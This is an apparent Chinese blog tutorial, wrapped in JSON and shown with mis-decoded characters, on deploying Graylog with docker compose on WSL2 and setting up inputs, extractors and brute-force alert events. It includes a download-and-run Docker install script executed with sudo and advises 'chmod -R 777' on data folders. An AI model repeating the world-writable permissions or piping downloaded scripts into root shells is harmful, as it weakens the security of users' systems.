[{"content":"èƒŒæ™¯ æœ€è¿‘åœ¨å·¥ä½œä¸­å‘ç°æˆ‘ä»¬åŸºæœ¬é‡‡å–ä¸€ç§DevOpsçš„å·¥ä½œæ–¹å¼ï¼Œå¼€å‘å³è¿ç»´ï¼Œæœ‰æ—¶ä¸€ä¸ªé—®é¢˜è¦å®šä½å¾ˆä¹…ï¼Œç»´æµ‹èƒ½åŠ›éå¸¸å·®ã€‚\né€ æˆç»´æŠ¤å›°éš¾çš„åŸå› æœ‰å¾ˆå¤šï¼Œæˆ‘è®¤ä¸ºæœ‰å‡ ç‚¹æ¯”è¾ƒé‡è¦ï¼š\nä»£ç ç¨³å®šæ€§å·®ã€‚è¿™ä¸ªé—®é¢˜å¯¹äºä¸€ä¸ªå‘å±•åˆæœŸçš„ä¸šåŠ¡æ¥è¯´æ¯”è¾ƒå¸¸è§ï¼Œåªèƒ½è¯´å°½åŠ›é¿å…ã€‚\næ—¥å¿—å¤ªå¤šã€‚å¼€å‘äººå‘˜å†™ä»£ç çš„æ—¶å€™æ€»æ˜¯æ¯«ä¸åæƒœæ—¥å¿—æ‰“å°æ“ä½œï¼Œè¿™äº›ä¿¡æ¯å¯¹äºæŸä¸€ä¸ªåŠŸèƒ½æ¥è¯´å¯èƒ½å¾ˆå…¨é¢ï¼Œä½†åœ¨ä¸€ä¸ªå®Œæ•´çš„æ¨¡å—é‡Œé¢ï¼Œè¿™ä¼šå¸¦æ¥è¶…çº§å¤šçš„å™ªå£°ã€‚\nåŸå§‹çš„åˆ†ææ–¹å¼ã€‚\nå› æ­¤æˆ‘å¸Œæœ›æ‰¾ä¸€ä¸ªèƒ½å¤Ÿæ–¹ä¾¿åœ°åˆ†æåºæ‚çš„æ—¥å¿—æ•°æ®çš„å·¥å…·ï¼Œè¯•å›¾å‡è½»è¿ç»´çš„å‹åŠ›ã€‚ç»è¿‡ç®€å•çš„é€‰å‹ï¼Œå†³å®šè¯•ä¸€è¯• Graylog ï¼Œæœ¬æ–‡å°ä½œè®°å½•ã€‚\nStep 0 ç¯å¢ƒé…ç½® é¢„è£…ï¼šWSL2 + Ubuntu22.04 + Windows Terminal\ndocker on WSL2 ä¸‹è½½ Docker Desktop for Winodws ï¼Œå‚»ç“œå¼å®‰è£…ã€‚\né¦–å…ˆè®¾ç½®å¯ç”¨WSLæ”¯æŒï¼š\næ¥ç€è¿›å…¥ é˜¿é‡Œäº‘é•œåƒåŠ é€Ÿ æä¸€ä¸ªåŠ é€Ÿå™¨ï¼Œç„¶ååœ¨Docker Desktopã€Docker Engineã€‘ä¸€æ é‡Œé¢é…ç½®åŠ é€Ÿå™¨åœ°å€ï¼š\naliyunåŠ é€Ÿ ç‚¹å‡»å³ä¸‹è§’ Apply \u0026amp; Resatrt å³å¯ã€‚\nå¦ä¸€ç§åœ¨WSL2ä¸Šå®‰è£…dockerçš„æ–¹æ³•ï¼š\næŒ‰ç…§ å‚è€ƒèµ„æ–™[2] æ‰€è¯´çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨WSLä¸Šç›´æ¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n$ curl -fsSL https://get.docker.com -o get-docker.sh $ sudo sh get-docker.sh $ sudo service docker start è¿™é‡Œæˆ‘å¹¶æœªå®è·µï¼Œä»…ä¾›è¯»è€…å‚è€ƒã€‚ä¸è¿‡ï¼Œä½œè€…çš„æé†’å¾ˆæœ‰å‚è€ƒä»·å€¼ï¼š\næ³¨æ„ï¼šä¸åŒäºå®Œå…¨linuxè™šæ‹Ÿæœºæ–¹å¼ï¼ŒWLS2ä¸‹é€šè¿‡apt install docker-ceå‘½ä»¤å®‰è£…çš„dockeræ— æ³•å¯åŠ¨ï¼Œå› ä¸ºWSL2æ–¹å¼çš„ubuntué‡Œé¢æ²¡æœ‰systemdã€‚ä¸Šè¿°å®˜æ–¹get-docker.shå®‰è£…çš„dockerï¼Œdockerdè¿›ç¨‹æ˜¯ç”¨ubuntuä¼ ç»Ÿçš„initæ–¹å¼è€Œésystemdå¯åŠ¨çš„ã€‚\nè¿™ä¸ªå‘æˆ‘æ˜¯è¸©è¿‡çš„ï¼Œåœ¨WSL2ä¸ŠæŒ‰ç…§Linuxæ–¹å¼å®‰è£…dockerä¼šå¤±è´¥ï¼ŒæœåŠ¡èµ·ä¸æ¥çš„ã€‚\ndocker compose Graylogè¿è¡Œéœ€è¦ä¸‰ä¸ªé•œåƒï¼š\nGraylog: graylog/graylog\nMongoDB: mongo\nElasticsearch: Elasticsearch\nè¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦æ‹‰å–ä¸‰ä¸ªé•œåƒï¼Œåˆ†åˆ«å¯åŠ¨å¯¹åº”çš„å®¹å™¨ï¼Œå…¶é—´è¿˜æ¶‰åŠè·¯å¾„æ˜ å°„ã€ç«¯å£æ˜ å°„ç­‰æ“ä½œï¼Œçƒ¦æ­»äººã€‚\nè¿˜å¥½æˆ‘ä»¬æœ‰ docker compose ï¼Œå®ƒæ˜¯ä¸€ä¸ªç”¨äºå®šä¹‰å’Œè¿è¡Œå¤šä¸ªå®¹å™¨çš„å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ yaml æ¥é…ç½®å®¹å™¨æœåŠ¡ï¼Œä½¿ç”¨ä¸€æ¡å‘½ä»¤æ‹‰èµ·æ‰€æœ‰å®¹å™¨ã€‚\nå…·ä½“æŠ€æœ¯ç»†èŠ‚åœ¨è¿™é‡Œå°±ä¸å¤šè®¨è®ºï¼Œæˆ‘ä¸»è¦è®°å½•å¦‚ä½•é…ç½®ä¸€ä¸ªæœ‰æ•ˆçš„Graylogçš„ docker-compose.yaml ã€‚\nversion: \u0026#39;2\u0026#39; services: # MongoDB: https://hub.docker.com/_/mongo/ mongodb: image: mongo:4.2 volumes: - /home/albusguo/graylog/volumes/mongo_data:/data/db # Elasticsearch: https://www.elastic.co/guide/en/elasticsearch/reference/7.10/docker.html elasticsearch: image: docker.elastic.co/elasticsearch/elasticsearch-oss:7.10.2 volumes: - /home/albusguo/graylog/volumes/es_data:/usr/share/elasticsearch/data environment: - http.host=0.0.0.0 - transport.host=localhost - network.host=0.0.0.0 - \u0026#34;ES_JAVA_OPTS=-Xms512m -Xmx512m\u0026#34; ulimits: memlock: soft: -1 hard: -1 mem_limit: 1g # Graylog: https://hub.docker.com/r/graylog/graylog/ graylog: image: graylog/graylog:4.3 volumes: - /home/albusguo/graylog/volumes/graylog_data:/usr/share/graylog/data entrypoint: /usr/bin/tini -- wait-for-it elasticsearch:9200 -- /docker-entrypoint.sh links: - mongodb:mongo - elasticsearch restart: always depends_on: - mongodb - elasticsearch ports: # Graylog web interface and REST API - 9000:9000 # Syslog TCP - 1514:1514 # Syslog UDP - 1514:1514/udp # GELF TCP - 12201:12201 # GELF UDP - 12201:12201/udp è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å’Œ å®˜æ–¹æ–‡æ¡£ æä¾›çš„Demoä¸å¤ªä¸€æ ·ï¼Œæˆ‘ä¸»è¦åšäº†å‡ ç‚¹ä¿®æ”¹ï¼š\nç›´æ¥æŠŠè·¯å¾„æ˜ å°„å†™æ­»åœ¨æ–‡ä»¶é‡Œé¢ï¼Œæ¯”å¦‚ /home/albusguo/graylog/volumes/graylog_data:/usr/share/graylog/data è¡¨ç¤ºæˆ‘ä¸»æœºä¸Šçš„ /home/albusguo/graylog/volumes/graylog_data å’ŒGraylogå®¹å™¨å†…çš„ /usr/share/graylog/data åŒæ­¥ï¼›\nåˆ é™¤äº†Graylogå®¹å™¨çš„ç¯å¢ƒå˜é‡ã€‚ä¾‹å¦‚å®˜æ–¹Demoé‡Œé¢é…ç½®äº† GRAYLOG_PASSWORD_SECRET ç”¨äºè®¾ç½®ç™»å½•å¯†ç ç­‰ï¼Œæˆ‘ä»¬è¦é‡‡ç”¨é…ç½®æ–‡ä»¶çš„æ–¹å¼ï¼Œå› æ­¤è¿™é‡Œæ²¡å¿…è¦å†å†™ã€‚\nStep 1 è¿è¡Œ æœ‰äº† docker-compose.yaml ä¹‹åï¼Œè¿˜éœ€è¦åšä¸€äº›å·¥ä½œæ‰å¯ä»¥æˆåŠŸæŠŠå®¹å™¨è¿è¡Œèµ·æ¥ã€‚\nGraylogé…ç½® åœ¨å†™ docker-compose.yaml çš„æ—¶å€™æåˆ°ï¼Œæˆ‘åœ¨æ–‡ä»¶ä¸­åˆ é™¤äº†Graylogå®¹å™¨çš„ç¯å¢ƒå˜é‡ï¼Œå› ä¸ºæˆ‘ä»¬è¦é€šè¿‡é…ç½®æ–‡ä»¶çš„æ–¹å¼æ¥ä¼ é€’è¿™äº›å‚æ•°ã€‚\nGraylogçš„é…ç½®æ–‡ä»¶å­˜å‚¨åœ¨ å®¹å™¨å†… çš„ /usr/share/graylog/data/config/ è·¯å¾„ä¸‹ï¼Œè€Œè¿™ä¸ªè·¯å¾„çš„çˆ¶è·¯å¾„ /usr/share/graylog/data è·Ÿæˆ‘ä»¬å®¿ä¸»ä¸Šçš„ /home/albusguo/graylog/volumes/graylog_data å…³è”åœ¨ä¸€èµ·ï¼Œå› æ­¤æˆ‘ä»¬è¦é¢„å…ˆåœ¨å®¿ä¸»ä¸Šè®¾ç½®å¥½é…ç½®æ–‡ä»¶ï¼Œå¦åˆ™Graylogæ— æ³•è·å–åˆ°æ­£ç¡®çš„å‚æ•°ã€‚\nå®˜æ–¹æ¨èçš„é…ç½®æ–‡ä»¶ä¸‹è½½åŠæ³•æ˜¯ï¼š\nmkdir -p ./graylog/config cd ./graylog/config wget https://raw.githubusercontent.com/Graylog2/graylog-docker/4.3/config/graylog.conf wget https://raw.githubusercontent.com/Graylog2/graylog-docker/4.3/config/log4j2.xml å¯ä»¥ç›´æ¥ç§‘å­¦ä¸Šç½‘æ‹¿åˆ°è¿™ä¸¤ä»½æ–‡ä»¶çš„å†…å®¹ï¼Œå†™åˆ°æ­£ç¡®çš„ä½ç½®ä¸Šå³å¯ã€‚\nroot@AlbusGuo-PC:/home/albusguo/graylog# ll /home/albusguo/graylog/volumes/graylog_data/config/ total 52 drwxrwxrwx 2 1100 1100 4096 Sep 25 12:14 ./ drwxrwxrwx 8 root root 4096 Sep 25 12:14 ../ -rw-rw-rw- 1 root root 35822 Sep 25 12:24 graylog.conf -rw-rw-rw- 1 root root 1629 Sep 25 12:13 log4j2.xml -rw-rw-rw- 1 1100 1100 36 Sep 25 12:14 node-id å£ä»¤è®¾ç½® Graylogéœ€è¦ä¸º admin è´¦æˆ·è®¾ç½®ç™»å½•å£ä»¤ï¼Œè¿™è¦æ±‚æˆ‘ä»¬åœ¨é…ç½®æ–‡ä»¶é‡Œå†™ä¸Šå£ä»¤æ˜æ–‡å’Œå£ä»¤çš„ SHA256 å€¼ã€‚\nä½¿ç”¨ pwgen ç”Ÿæˆå£ä»¤ï¼Œä½æ•°ä¸€å®šè¦å¤šä¸€ç‚¹ï¼Œæœ‰äº›æ•™ç¨‹åœ¨è¿™ä¸€æ­¥ç®€å•ç”Ÿæˆäº†åå‡ ä½å£ä»¤ï¼Œè€Œæˆ‘ä½¿ç”¨çš„Graylogè¦æ±‚ 64 ä½ä»¥ä¸Šï¼Œåœ¨è¿™é‡Œä¼šç¿»è½¦ã€‚\npwgen -N 1 -s 96 # è®°å½•è¿™ä¸ªè¾“å‡ºï¼Œè®°ä½œ pwd echo -n\u0026#34;Enter Password: \u0026#34; \u0026amp;\u0026amp; head -1 \u0026lt;/dev/stdin | tr -d \u0026#39;\\n\u0026#39; | sha256sum | cut -d\u0026#34; \u0026#34; -f1 # è¾“å…¥åˆšæ‰å¾—åˆ°çš„ pwdï¼Œå¾—åˆ°å®ƒçš„SHA256å€¼ æˆ‘ä»¬å¾—åˆ°çš„è¿™ä¸¤ä¸ªå€¼ï¼Œåˆ†åˆ«å¡«åˆ° graylog.conf æ–‡ä»¶å½“ä¸­çš„ password_secret å­—æ®µå’Œ root_password_sha2 å­—æ®µï¼Œè¿™æ ·æ‰å¯ä»¥ä½¿ç”¨ admin ç™»å½•WebæœåŠ¡ã€‚\nè·¯å¾„æƒé™ ç”±äºæˆ‘ä»¬åšäº†è·¯å¾„æ˜ å°„ï¼Œå°±è¦ä½¿å¾—å®¹å™¨æœ‰å¯¹åº”å®¿ä¸»è·¯å¾„çš„å†™æƒé™ã€‚ä¾‹å¦‚æŠŠä¸»æœºä¸Šçš„ /home/albusguo/graylog/volumes/es_data æ˜ å°„åˆ° elastic-search å®¹å™¨å†…çš„ /usr/share/elasticsearch/data è·¯å¾„ï¼Œé‚£ä¹ˆè¿™ä¸ªå®¹å™¨å°±è¦æœ‰å†™ /home/albusguo/graylog/volumes/es_data çš„æƒé™ï¼Œå¦åˆ™ä¼šå› å®¹å™¨å†…éƒ¨åšçš„ä¿®æ”¹æ— æ³•åŒæ­¥åˆ°ä¸»æœºä¸Šè€Œäº§ç”Ÿé”™è¯¯ã€‚\nä¸€ä¸ªæ¯”è¾ƒç®€å•çš„æ–¹æ³•æ˜¯ chmod -R 777 /home/albusguo/graylog/volumes/ ï¼Œå¼€è¿™ä¸ªè·¯å¾„ä¸‹çš„å…¨éƒ¨æƒé™ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ a+w çš„é€‰é¡¹ï¼Œæ€»ä¹‹è¿™æ˜¯ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ã€‚\nè¿è¡Œ ä¸‡äº‹ä¿±å¤‡ï¼Œå¯åŠ¨è¿è¡Œï¼\ndocker-compose up # ........... # graylog_1 | 2022-09-25 07:29:06,729 INFO : org.graylog2.bootstrap.ServerBootstrap - Graylog server up and running. Step 2 é…ç½®è¾“å…¥æµ é…ç½® æˆåŠŸå¯åŠ¨å®¹å™¨ä¹‹åï¼Œå¯ä»¥é€šè¿‡ localhost:9000 è®¿é—®åˆ°Graylogçš„webç•Œé¢ã€‚\nè´¦å·æ˜¯ admin ï¼Œå¯†ç æ˜¯ æ­¤å‰ ç”Ÿæˆå¹¶å†™å…¥é…ç½®æ–‡ä»¶çš„æ˜æ–‡ã€‚\nè¿›å…¥Webç•Œé¢ï¼Œç›´æ¥å¼€å§‹é…ç½®è¾“å…¥æµã€‚ã€Systemã€‘â€”â€”ã€Inputsã€‘ï¼Œé€‰æ‹©ä¸€ä¸ªè¾“å…¥æµï¼Œå¦‚TCPæ–‡æœ¬æ•°æ®ï¼š\ninputs ç‚¹å‡»ã€Launch new inputã€‘å¯åŠ¨è¯¥è¾“å…¥æµï¼Œæ¥åˆ°é…ç½®ç•Œé¢ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸¤ç‚¹ï¼š\nconfig ä¸€å®šè¦æ³¨æ„è¿™é‡Œçš„ç«¯å£å·ï¼Œç”±äºæˆ‘ä»¬çš„Graylogè¿è¡Œåœ¨dockerå†…ï¼Œå¤–ç•Œæ•°æ®è¦é€šè¿‡ä¸»æœºç«¯å£è½¬å‘åˆ°å®¹å™¨ç«¯å£ï¼Œè¿™é‡Œçš„ç«¯å£è¦é€‰æ‹©æ­¤å‰é…ç½®è¿‡ç«¯å£æ˜ å°„çš„ç«¯å£ã€‚\nè¿˜è®°å¾—æˆ‘ä»¬çš„ docker-compose.yaml å—ï¼Ÿåœ¨è¿™ä¸ªæ–‡ä»¶å†…ä¸ºgraylogå®¹å™¨é…ç½®äº†ç«¯å£æ˜ å°„ï¼š\n===== snip ===== ports: # Graylog web interface and REST API - 9000:9000 # Syslog TCP - 1514:1514 # Syslog UDP - 1514:1514/udp # GELF TCP - 12201:12201 # GELF UDP - 12201:12201/udp å¿…é¡»é€‰æ‹©è¿™é‡Œæœ‰çš„ç«¯å£ï¼Œå¦åˆ™æˆ‘ä»¬çš„æ•°æ®æ— æ³•åˆ°è¾¾å®¹å™¨ã€‚\nä»¥TCPç«¯å£ 1514 ä¸ºä¾‹ï¼Œåªè¦åœ¨inputé…ç½®ç•Œé¢å†™ä¸Šè¿™ä¸ªç«¯å£ï¼Œæ»‘åˆ°åº•ç«¯ä¿å­˜ï¼Œå°±å®Œæˆäº†ä¸€ä¸ªè¾“å…¥æµçš„é…ç½®ï¼š\nport config æ£€æŸ¥ æˆ‘ä»¬æ¥æ£€æŸ¥ä¸€ä¸‹è¿™ä¸ªè¾“å…¥æµæ˜¯å¦ç”Ÿæ•ˆã€‚\néšä¾¿æ‰¾ä¸€äº›æ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¥è‡ªå·±çš„ä¸€ä¸ªå°ç«™ç‚¹çš„æ—¥å¿—ä¸ºä¾‹ï¼š\ncat log_example.log ... 20220924 13:06:36.291066 UTC 3863 DEBUG [handleError] [10.206.0.6:443--8.142.110.170:38452] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 13:06:41.610243 UTC 3863 DEBUG [handleError] [10.206.0.6:443--8.142.110.170:46002] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 13:06:43.722297 UTC 3863 DEBUG [handleError] [10.206.0.6:443--8.142.110.170:51386] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 13:06:46.300990 UTC 3863 DEBUG [handleError] [10.206.0.6:443--8.142.110.170:55796] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 14:55:20.584554 UTC 3863 DEBUG [handleError] [10.206.0.6:80--8.142.110.170:34386] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 14:59:44.488731 UTC 3863 DEBUG [handleError] [10.206.0.6:443--82.157.59.178:15274] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 15:00:31.891461 UTC 3864 ERROR error - MysqlConnection.cc:536 20220924 15:00:31.891501 UTC 3864 ERROR Error(2006) [HY000] \u0026#34;MySQL server has gone away\u0026#34; - MysqlConnection.cc:498 20220924 15:00:31.891508 UTC 3864 ERROR sql:select * from excerpts - MysqlConnection.cc:500 20220924 15:27:40.884592 UTC 3863 DEBUG [handleError] [10.206.0.6:443--167.248.133.119:34466] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 æˆ‘ä»¬ä½¿ç”¨ netcat æ¥æŠŠè¿™äº›æ•°æ®å‘é€åˆ°graylogçš„ç«¯å£ä¸Šï¼Œ æ³¨æ„åˆšæ‰é…ç½®çš„è¾“å…¥æµç«¯å£æ˜¯å®¹å™¨ç«¯å£ï¼Œè€Œæ•°æ®å‘é€çš„ç«¯å£æ˜¯ä¸»æœºç«¯å£ ï¼Œå¦‚æœä½ åœ¨ç«¯å£æ˜ å°„é˜¶æ®µæŠŠä¸¤è€…çš„ç«¯å£è®¾ç½®ä¸ºä¸åŒï¼Œåœ¨è¿™é‡Œå°±è¦èŠ±ç‚¹æ—¶é—´ç†æ¸…å®ƒä»¬çš„å…³ç³»ã€‚\ncat log_example.log | nc 127.0.0.1 1514 æ¥åˆ°graylogçš„ã€Searchã€‘ç•Œé¢ï¼Œçœ‹åˆ°åˆšæ‰å‘é€çš„æ—¥å¿—æ•°æ®ï¼Œå³è¯´æ˜è¾“å…¥æµå·¥ä½œæ­£å¸¸ã€‚\nSearch Step 3 é…ç½®æå–å™¨ extractor æå–å™¨æ˜¯ä»è¾“å…¥æµå½“ä¸­æå–å­—æ®µçš„å·¥å…·ï¼Œè¿™å¸¸è§äºéœ€è¦å¯¹æ—¥å¿—æ•°æ®è¿›è¡Œåˆ†æçš„åœºæ™¯ï¼Œå¦‚ç½‘ç»œè¿æ¥æ—¥å¿—ï¼Œæˆ‘ä»¬éœ€è¦ä»æ—¥å¿—å½“ä¸­æå–è®¿å®¢IPã€‚\nä¸è¿‡è¿™é‡Œè¿˜æ˜¯ä»¥åˆšæ‰çš„æ—¥å¿—ä¸ºä¾‹ï¼Œæ³¨æ„åˆ°æ—¥å¿—å½“ä¸­æœ‰ä¸€äº›æ—¥å¿—å½¢å¦‚ï¼š\n20220924 15:00:31.891508 UTC 3864 ERROR sql:select * from excerpts - MysqlConnection.cc:500 ä¼¼ä¹æ˜¯æ‰§è¡ŒSQLè¯­å¥çš„è®°å½•ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬çš„ç„¦ç‚¹å°±æ˜¯è¢«æ‰§è¡Œçš„SQLè¯­å¥æ˜¯ä»€ä¹ˆï¼Œæ¥ä¸‹æ¥é…ç½®æå–å™¨æ¥æŠŠå®ƒä»æ—¥å¿—å½“ä¸­æå–å‡ºæ¥ã€‚\nè¿˜æ˜¯åœ¨é…ç½®è¾“å…¥æµçš„ç•Œé¢ï¼Œé€‰æ‹©é…ç½®æå–å™¨ï¼š\nextractors æ·»åŠ æå–å™¨ï¼Œé€‰ä¸­ä¸€æ¡ç¤ºä¾‹æ•°æ®ï¼ˆMessage IDå¯ä»¥ä»ã€Searchã€‘ç•Œé¢è·å–ï¼‰ï¼š\nadd extractor åœ¨ç¤ºä¾‹æ•°æ®ä¸Šé€‰æ‹©æå–ç±»å‹ï¼Œæœ€å¸¸è§çš„æ˜¯æ­£åˆ™ï¼š\nreg extractor æ’°å†™é€‚åˆäºæ­¤ç±»æ•°æ®çš„æ­£åˆ™ï¼Œè¦æå–çš„ ç›®æ ‡å­—æ®µç”¨å°æ‹¬å·æ‹¬èµ·æ¥ ï¼Œå¹¶ä¸”è¦æ³¨æ„æ­£åˆ™çš„æ™®é€‚æ€§ï¼š\nreg å¦‚æœæ²¡æœ‰é—®é¢˜ï¼Œå°±å¯ä»¥ä¸ºæå–å‡ºçš„å­—æ®µå‘½åï¼Œä¿å­˜å³å¯ã€‚\né‡æ–°æ‰“å…¥æ•°æ®ï¼Œå†æ¥åˆ°ã€Searchã€‘ç•Œé¢ï¼Œç‚¹å¼€ä¸€æ¡æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»æå–å‡ºäº† SQL_COMMAND å­—æ®µï¼ˆå­—æ®µåæ˜¯è‡ªå·±å†™çš„ï¼‰ï¼š\ne.g. è€Œå…¶ä»–çš„æ—¥å¿—å†…å®¹ä¸ç¬¦åˆæˆ‘ä»¬åˆšæ‰å†™çš„æ­£åˆ™ï¼Œé‚£ä¹ˆå®ƒå°±ä¸å­˜åœ¨è¿™ä¸ªå­—æ®µï¼š\ne.g. è¿™ä¸ªå­—æ®µçš„æœ‰æ— ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºæˆ‘ä»¬å¯¹æ—¥å¿—è¿›è¡Œç­›é€‰çš„ä¸€ä¸ªè§„åˆ™ï¼š\nsearch æ›´å¤šçš„ç­›é€‰å†™æ³•å¯ä»¥å‚è€ƒ å®˜æ–¹æ–‡æ¡£ ã€‚\nStep 4 äº‹ä»¶å’Œå‘Šè­¦ é™¤äº†ç­›é€‰ä¹‹å¤–ï¼ŒGraylogè¿˜æ”¯æŒäº‹ä»¶å’Œå‘Šè­¦çš„é…ç½®ã€‚\nã€Alertsã€‘â€”â€”ã€Event Definitionsã€‘ï¼Œæ–°å¢äº‹ä»¶ï¼š\nevent äº‹ä»¶çš„æ ¸å¿ƒæ˜¯è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬è¦ä»æ—¥å¿—ä¸­è¿‡æ»¤å‡ºæˆ‘ä»¬å…³æ³¨çš„äº‹ä»¶ï¼Œå¯ä»¥ä½¿ç”¨åˆšæ‰ä½¿ç”¨è¿‡çš„ ç­›é€‰è¯­æ³• ï¼š\nfilter è¿˜å¯ä»¥ä»æ—¥å¿—å½“ä¸­æå–å…³é”®å­—æ®µï¼Œä»¥ä¾¿æˆ‘ä»¬å¯¹äº‹ä»¶è¿›è¡Œåˆ†æï¼š\nfields äº‹ä»¶å‘ç”Ÿæ—¶ï¼ŒGraylogæ‰§è¡Œæé†’åŠ¨ä½œï¼Œä¾‹å¦‚å‘æŒ‡å®šé‚®ç®±å‘é€é‚®ä»¶ï¼Œåœ¨è¿™é‡Œå°±ä¸é…ç½®äº†ã€‚\næ•´ä¸ªäº‹ä»¶çš„é…ç½®å¦‚ä¸‹ï¼š\nevent summary è‡³æ­¤ï¼Œå¯ä»¥ä»ä¸€å¤§å †æ—¥å¿—å½“ä¸­åˆ†æå‡ºæˆ‘ä»¬æƒ³è¦çš„äº‹ä»¶ï¼Œå¹¶ä¸”äº‹ä»¶å½“ä¸­åŒ…å«äº†æˆ‘ä»¬é…ç½®çš„é¢å¤–å­—æ®µï¼š\nevents Final åˆ†æ\u0026amp;å°ç»“ åˆ†æ ç®€å•ä½¿ç”¨è¿‡Graylogä¹‹åï¼Œæˆ‘æƒ³å¯¹å®ƒçš„åŠŸèƒ½å’Œæ„ä¹‰åšä¸€ç‚¹åˆ†æã€‚\né¦–å…ˆï¼Œä¹ä¸€çœ‹å¾ˆå®¹æ˜“æŠŠæå–å™¨ã€ç­›é€‰ã€äº‹ä»¶æ··ä¸ºä¸€è°ˆï¼Œå°¤å…¶æ˜¯ä¸‰è€…éƒ½æ”¯æŒæ­£åˆ™ï¼›ä½†æ˜¯ï¼Œå®ƒä»¬çš„å®šä½æ˜¯æ˜ç¡®çš„ï¼š\næå–å™¨ï¼šä»åŸå§‹æ¶ˆæ¯é‡Œé¢æå–å‡ºå¯ç”¨å­—æ®µï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ—¥å¿—å½“ä¸­çš„æŸäº›å†…å®¹ï¼Œé‚£ä¹ˆä¸€å®šéœ€è¦æå–å™¨ï¼›ç”šè‡³ï¼Œæå–å™¨å¾—åˆ°çš„å­—æ®µå¯ä»¥è¢«ç­›é€‰è¯­å¥å’Œäº‹ä»¶æ‰€ä½¿ç”¨ï¼Œå› æ­¤å®ƒå¯ä»¥çœ‹æˆæ˜¯æ—¥å¿—åˆ†æçš„ä¸€ä¸ªåŸºç¡€ã€‚\nç­›é€‰ï¼šç­›é€‰å’Œäº‹ä»¶åŸºæœ¬æ˜¯ä¸€æ ·çš„ï¼Œä½†ç­›é€‰çš„èƒ½åŠ›æ¯”è¾ƒå¼±ï¼Œæˆ‘ä»¬å¯ä»¥ä»ä¸€å¤§å †æ—¥å¿—é‡Œé¢ç­›é€‰å‡ºæˆ‘ä»¬éœ€è¦çš„æ—¥å¿—ï¼Œä½†ç­›é€‰çš„ç»“æœå¹¶ä¸èƒ½è¯´æ˜ä»€ä¹ˆå†…å®¹ï¼Œç”šè‡³äºæˆ‘ä»¬æ‹¿ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨æ¥ç­›éƒ½å¯ä»¥å¾—åˆ°å·®ä¸å¤šçš„æ•ˆæœã€‚\näº‹ä»¶ï¼šäº‹ä»¶æ˜¯æ—¥å¿—å¤„ç†çš„ç»“æœï¼Œå®ƒä¸ä»…æ”¯æŒç­›é€‰ï¼Œè¿˜æ”¯æŒèšåˆã€‚æˆ‘ä»¬åœ¨åˆ†æé—®é¢˜çš„æ—¶å€™é€šå¸¸å…³æ³¨äº‹ä»¶è€Œä¸æ˜¯æ—¥å¿—ï¼Œæˆ‘ä»¬è¦çŸ¥é“å‘ç”Ÿäº†ä»€ä¹ˆï¼Œè€Œä¸æ˜¯æ‰€æœ‰çš„ç»†èŠ‚ã€‚\nä»¥ä¸€ä¸ªåœºæ™¯æ¥å¼•å‘è¯»è€…ä¸æˆ‘ä¸€èµ·è¿›è¡Œç»¼åˆæ€§æ€è€ƒï¼šå¦‚ä½•ä½¿ç”¨Graylogå¯¹å¸¸è§çš„ æš´åŠ›ç ´è§£ è¿›è¡Œå‘Šè­¦ï¼Ÿ\nè‡ªä¸Šå¾€ä¸‹çœ‹ï¼Œæˆ‘ä»¬å…³æ³¨çš„æ˜¯ æš´åŠ›ç ´è§£ äº‹ä»¶ï¼Œå› æ­¤è¿™ä¸ªäº‹ä»¶æ˜¯å¿…ç„¶è¦å®šä¹‰çš„ã€‚äº‹ä»¶çš„ç­›é€‰æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æ­£åˆ™æ¥åŒ¹é… ç™»å½•å¤±è´¥ çš„æ—¥å¿—ï¼Œä½†å¹¶ä¸æ˜¯æ¯æ¡ç™»å½•å¤±è´¥æ—¥å¿—éƒ½åº”è¯¥è§¦å‘è¿™ä¸ªäº‹ä»¶ï¼Œå› æ­¤è¦è®¾ç½®èšåˆï¼Œæ¯”å¦‚åŒ¹é… 20 æ¡å¤±è´¥æ—¥å¿—å°±è§¦å‘æš´åŠ›ç ´è§£äº‹ä»¶ã€‚\näº‹ä»¶è§¦å‘ä¹‹åï¼Œæˆ‘ä»¬æœ€å…³å¿ƒçš„é—®é¢˜åº”è¯¥æ˜¯æ”»å‡»è€…æ˜¯è°ï¼Œè¿™ä¸ªä¿¡æ¯å¿…é¡»è¦ä»æ—¥å¿—å½“ä¸­æå–ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¦å¯¹ ç™»å½•å¤±è´¥ æ—¥å¿—å†é…ç½®ä¸€ä¸ªæå–å™¨ï¼Œæ¥æŠŠæ—¥å¿—å½“ä¸­çš„æºIPæå–å‡ºæ¥ã€‚\nè‡³æ­¤ï¼Œæˆ‘ä»¬å°±æŠŠæå–å™¨ã€ç­›é€‰å’Œäº‹ä»¶ç»¼åˆèµ·æ¥äº†ã€‚\nä¸è¿‡è¿˜æ˜¯æœ‰ä¸ªå°bugï¼Œäº‹ä»¶èšåˆçš„æ—¶å€™åªèƒ½è€ƒè™‘å…·æœ‰ ç›¸åŒæºIP 